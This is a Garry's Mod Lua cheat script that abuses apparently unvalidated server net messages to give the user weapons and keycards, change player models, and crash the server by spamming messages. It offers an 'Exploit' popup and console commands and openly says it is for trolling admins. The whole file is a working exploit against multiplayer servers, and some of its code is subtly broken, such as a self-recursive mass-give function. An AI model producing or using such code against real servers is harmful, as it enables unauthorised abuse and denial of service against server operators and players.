function Loot_Exploitable_Give_Weapon( weapon_name )
    net.Start( "O_GiveWeapon" )
    net.WriteString( weapon_name )
    net.SendToServer()
end

function Loot_Exploitable_Give_PlayerModel( model_path )
	net.Start( "O_SetModel" )
	net.WriteString( model_path )
	net.SendToServer()
end

function Loot_Exploitable_Mass_Give_Weapons( )
	for k, v in pairs( player.GetAll() ) do
		local weapons = v:GetWeapons()
		Loot_Exploitable_Mass_Give_Weapons( weapons:GetClass() )
	end
end

function Loot_Exploitable_FastGiver()
    local fast_giver = { "swb_m4a1", "swb_m249", "weapon_trank", "swb_fiveseven", "swb_knife", "med_kit", "guthscp_keycards_lvl_5" }
    for k, v in pairs( fast_giver ) do 
        Loot_Exploitable_Give_Weapon(v)
    end
end

function draw_textbox(strTitle, strBtn, strDefaultText, fnEnter)
        local Window = vgui.Create ("DFrame")
        Window:SetTitle (strTitle)
        Window:ShowCloseButton(true)
        Window:MakePopup()
        Window:SetSize (250, 100)
        Window:Center()
        Window:SetKeyboardInputEnabled(true)
        Window:SetMouseInputEnabled(true)
        Window.Paint = function()
                draw.RoundedBox ( 0, 0, 0, Window:GetWide(), Window:GetTall(), Color(0,0,0,105) )
                draw.RoundedBox ( 0, 1, 1, Window:GetWide()-2, Window:GetTall()-2, Color(0,0,0,100) )
                surface.SetDrawColor( 255, 255, 255 )
                surface.DrawOutlinedRect( 0, 0, Window:GetWide(), Window:GetTall() )
        end
 
        local TextEntr = vgui.Create( "DTextEntry", Window)
        TextEntr:SetPos (75, 30)
        TextEntr:SetSize (110, 20)
        TextEntr:SetMultiline (false)
        TextEntr:SetAllowNonAsciiCharacters( true )
        TextEntr:SetText(strDefaultText || "")
        TextEntr:SetTextColor( Color(0,0,0,255) )
        TextEntr:SetEnterAllowed (true)


 
        local Btn = vgui.Create ("DButton", Window)
        Btn:SetText(strBtn)
        Btn:SetSize (110, 20)
        Btn:SetPos (75, 60)
        Btn:SetTextColor( Color( 255, 255, 255 ) )
        Btn.Paint = function()
                surface.SetDrawColor( 255, 255, 255 )
                surface.DrawOutlinedRect( 0, 0, Btn:GetWide(), Btn:GetTall() )
                draw.RoundedBox ( 0, 1, 1, Window:GetWide()-2, Window:GetTall()-2, Color(0,0,0,205) )
        end
        
        Btn.DoClick = function ()
                Loot_Exploitable_Give_Weapon( TextEntr:GetValue() )
        end
end



hook.Add( "OnContextMenuOpen", "StringExploit", function() 
    draw_textbox( "Enter weapon name", "Exploit", "", function(a) print("[StringExploit] - Press C and enter weapon name, press to exploit and troll stupid admins.") end)
end)

concommand.Add( "StringExploit_Fast", function() 
	Loot_Exploitable_FastGiver()
end)

concommand.Add( "StringExploit_SetModel", function( ply, cmd, args ) 
	Loot_Exploitable_Give_PlayerModel( args[1] )
end)

concommand.Add( "StringExploit_GiveWeapon", function( ply, cmd, args ) 
	Loot_Exploitable_Give_Weapon( args[1] )
end)

concommand.Add( "StringExploit_Crash", function() 
	for i=0, 20 do
		net.Start( "O_SetModel" )
		net.SendToServer()
	end
end)

concommand.Add( "StringExploit_MassExploit",  Loot_Exploitable_Mass_Give_Weapons )